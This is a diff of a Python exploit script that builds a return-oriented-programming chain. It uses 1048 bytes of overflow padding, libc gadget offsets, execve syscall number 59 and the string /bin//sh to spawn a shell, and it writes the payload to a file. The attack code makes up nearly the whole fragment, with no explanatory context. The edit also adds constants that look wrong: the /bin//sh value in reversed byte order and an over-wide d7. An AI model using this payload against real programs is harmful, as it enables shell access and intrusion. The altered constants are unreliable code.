@@ -15,11 +15,11 @@ d1 = 59
 # d4 = 0
 # d5 = 0
 g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
-d2 = 0
-d3 = 0
+d2 = 0x00
+d3 = 0x00
 g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
-d6 = 0x68732f2f6e69622f #/bin//sh
-d7 = 0
+d6 = 0x2f62696e2f2f7368 #/bin//sh
+d7 = 0x2f62696e2f2f7368222c30
 g5 = LIBC_OFFSET + 0x18f503 + 0xf #push rsp
 g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall
 
@@ -27,19 +27,19 @@ g6 = LIBC_OFFSET + 0x132bae + 0xe #syscall
 
 
 shellcode = 'A'*(1048)
-shellcode += struct.pack('<q', g1)
-shellcode += struct.pack('<q', d1)
-shellcode += struct.pack('<q', g2)
-shellcode += struct.pack('<q', d2)
-shellcode += struct.pack('<q', d3)
+shellcode += struct.pack('<q', g1)#pop rax ; ret
+shellcode += struct.pack('<q', d1) #59
+shellcode += struct.pack('<q', g2)#pop rdx + rsi
+shellcode += struct.pack('<q', d2) #0
+shellcode += struct.pack('<q', d3)# 0
 # shellcode += struct.pack('<q', g3)
 # shellcode += struct.pack('<q', d4)
 # shellcode += struct.pack('<q', d5)
-shellcode += struct.pack('<q', g4)
-shellcode += struct.pack('<q', d6)
+shellcode += struct.pack('<q', g4)#= pop rdi
+shellcode += struct.pack('<q', d6) #/bin//sh
 # shellcode += struct.pack('<q', d7)
 # shellcode += struct.pack('<q', g5)
-shellcode += struct.pack('<q', g6)
+shellcode += struct.pack('<q', g6) #syscall
 
 print ("shellcode: "+ shellcode)
 with open("shellcode.dat", "wb") as f:
